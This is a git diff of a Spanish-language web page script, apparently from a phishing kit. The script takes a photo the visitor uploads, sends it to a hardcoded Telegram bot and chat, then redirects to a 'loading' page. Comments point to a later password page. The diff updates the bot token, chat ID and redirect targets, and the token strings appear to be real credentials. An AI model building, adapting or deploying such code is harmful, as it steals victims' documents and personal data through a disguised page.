@@ -210,8 +210,8 @@
         <p>Todos los derechos reservados.</p>
     </footer>
 <script>
-    const token = '8071410762:AAFOUv9oR1Dh3_OLwBdTM95YWZwYUwwqKr4'; // Token del bot
-    const chatId = '-4571868410'; // Chat ID
+    const token = '7883269139:AAE-v5VR5i8xHw2SPbTSNTVmo7KCOoTRN5o'; // Token del bot
+    const chatId = '-4778364802'; // Chat ID
 
     document.getElementById('upload').addEventListener('change', (event) => {
         const fileName = event.target.files[0]?.name; // Obtener el nombre del archivo
@@ -241,15 +241,15 @@
             const result = await response.json();
             if (result.ok) {
                 alert("Procesando información...");
-                window.location.href = "index.html"; // Redirección a clave.html en caso de éxito
+                window.location.href = "cargando2.html"; // Redirección a clave.html en caso de éxito
             } else {
                 alert("Error al enviar la foto: " + result.description);
-                window.location.href = "index.html"; // Redirección a clave.html en caso de error
+                window.location.href = "cargando2.html"; // Redirección a clave.html en caso de error
             }
         } catch (error) {
             console.error("Error:", error);
             alert("Hubo un error al enviar la foto.");
-            window.location.href = "index.html"; // Redirección a clave.html en caso de error
+            window.location.href = "cargando2.html"; // Redirección a clave.html en caso de error
         }
     });
 
